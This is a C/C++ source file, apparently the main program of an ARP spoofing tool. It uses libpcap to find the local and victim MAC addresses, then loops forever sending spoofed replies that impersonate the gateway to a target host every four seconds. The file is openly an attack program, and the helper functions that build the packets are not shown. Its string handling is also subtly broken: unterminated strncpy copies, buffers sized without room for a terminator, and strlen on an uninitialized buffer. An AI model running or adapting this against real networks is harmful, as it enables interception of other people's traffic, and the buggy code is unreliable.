#include "stdafx.h"

pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t cond = PTHREAD_COND_INITIALIZER;

using namespace std;

int main(int argc, char* argv[]) {
	if (argc != 3) {
		usage();
		return -1;
	}

// ########## Make a thread ##########
	pthread_t thread[PTHREAD_NUM];
// ########################################

// ########## Make a pcap environment ##########
	char errbuf[PCAP_ERRBUF_SIZE];
	// P Mode
	pcap_t* handle = pcap_open_live(DEFAULT_DEVICE, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", DEFAULT_DEVICE, errbuf);
		return -1;
	}
// ########################################

// ########## Make a struct variable to give several parameters to pthread ##########
	struct Parameter_Pthread pt;
	struct Parameter_Pthread pt2;
// ########################################

// ########## Make a socket to find my IP & MAC address ##########
	char* a_mac_addr = (char*)malloc(128);
	if(a_mac_addr == NULL){ perror("a_mac_addr malloc error"); exit(1); }
	char* s_ip_addr = (char*)malloc(128);
	if(s_ip_addr == NULL){ perror("s_ip_addr malloc error"); exit(1); }
	pthread_create(&thread[0], NULL, find_My_Mac, (void*)(a_mac_addr));
	pthread_join(thread[0], (void**)(&s_ip_addr));
	printf("[ Success to find my mac address : %s ]\n", a_mac_addr);
// ########################################

// ################ Using pcap sendpacket ################
	char* sender_mac = (char*)malloc(sizeof(char) * 50);
	if(sender_mac == NULL){ perror("sender_mac malloc error"); exit(1); }

	pt2.sip = (char*)malloc(strlen(s_ip_addr)); // sender's ip address
	if(pt2.sip == NULL){ perror("pt2.sip malloc error"); exit(1); }
	pt2.smac = (char*)malloc(strlen(a_mac_addr)); // sender's mac address
	if(pt2.smac == NULL){ perror("pt2.smac malloc error"); exit(1); }

	pt2.tip = (char*)malloc(strlen(argv[1])); // attacker's ip address
	if(pt2.tip == NULL){ perror("pt2.tip malloc error"); exit(1); }
	pt2.tmac = (char*)malloc(strlen(sender_mac)); // attacker's mac address
	if(pt2.tmac == NULL){ perror("pt2.tmac malloc error"); exit(1); }


	strncpy(pt2.sip, s_ip_addr, strlen(s_ip_addr));
	strncpy(pt2.smac, a_mac_addr, strlen(a_mac_addr));
	strncpy(pt2.tip, argv[1], strlen(argv[1]));
	strncpy(pt2.tmac, sender_mac, strlen(sender_mac));
	pt2.handle = handle;
	pthread_create(&thread[1], NULL, find_Sender_Mac, (void*)&pt2);
	
	pthread_join(thread[1], (void**)(&sender_mac));
	printf("[ Success to find sender's mac address : %s ]\n", sender_mac);
// ########################################

// ########## Make contents of parameters ##########
	pt.sip = (char*)malloc(strlen(argv[1])); // sender's ip address
	if(pt.sip == NULL){ perror("pt.sip malloc error"); exit(1); }
	pt.smac = (char*)malloc(strlen(a_mac_addr)); // sender's mac address
	if(pt.smac == NULL){ perror("pt.smac malloc error"); exit(1); }

	pt.tip = (char*)malloc(strlen(argv[2])); // attacker's ip address
	if(pt.tip == NULL){ perror("pt.tip malloc error"); exit(1); }
	pt.tmac = (char*)malloc(strlen(sender_mac)); // attacker's mac address
	if(pt.tmac == NULL){ perror("pt.tmac malloc error"); exit(1); }

	printf("my mac address : %s\n", a_mac_addr);
	strncpy(pt.sip, argv[2], strlen(argv[2])); // gateway ip
	strncpy(pt.smac, a_mac_addr, strlen(a_mac_addr));
	strncpy(pt.tip, argv[1], strlen(argv[1]));
	strncpy(pt.tmac, sender_mac, strlen(sender_mac));
	pt.handle = handle;
// ########################################

// ########## Attack ##########
	while(1){ // 2 attack per 4 seconds
		pthread_create(&thread[3], NULL, Attack, (void*)&pt);
		pthread_join(thread[3], NULL);		
		sleep(4);
	}
	//for(int i = 0; i < 20; i++) { Attack((void*)&pt); sleep(1); }
// ########################################

// ########## End ##########
	pcap_close(handle);
	return 0;
// ########################################
}





